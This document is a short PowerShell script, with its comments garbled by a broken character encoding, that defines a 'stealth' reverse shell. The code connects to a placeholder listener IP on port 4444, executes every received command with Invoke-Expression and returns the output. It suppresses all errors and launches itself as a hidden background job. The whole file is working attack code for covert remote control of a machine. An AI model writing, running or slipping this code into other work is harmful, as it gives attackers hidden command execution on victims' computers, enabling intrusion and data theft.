# ���εķ���Shell�ű�
function Start-StealthReverseShell {
    $server = "YOUR_LISTENER_IP"  # �滻Ϊ��ļ���IP
    $port = 4444                  # �滻Ϊ��ļ����˿�

    try {
        $client = New-Object System.Net.Sockets.TCPClient($server, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | %{0}

        # ���ͳ�ʼ��ʾ��
        $prompt = "PS " + (Get-Location).Path + "> "
        $promptBytes = [Text.Encoding]::ASCII.GetBytes($prompt)
        $stream.Write($promptBytes, 0, $promptBytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [Text.Encoding]::ASCII.GetString($bytes, 0, $i).Trim()
            
            # �����˳�����
            if($data -eq "exit") { break }
            
            # ִ�������ȡ���
            $result = (Invoke-Expression $data 2>&1 | Out-String)
            $response = $result + "PS " + (Get-Location).Path + "> "
            $responseBytes = [Text.Encoding]::ASCII.GetBytes($response)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
        }
        $client.Close()
    } catch {
        # ��Ĭ������󣬲�����κ���Ϣ
    }
}

# �ں�̨��ҵ����������һ�����ؽ���
Start-Job -ScriptBlock ${function:Start-StealthReverseShell} | Out-Null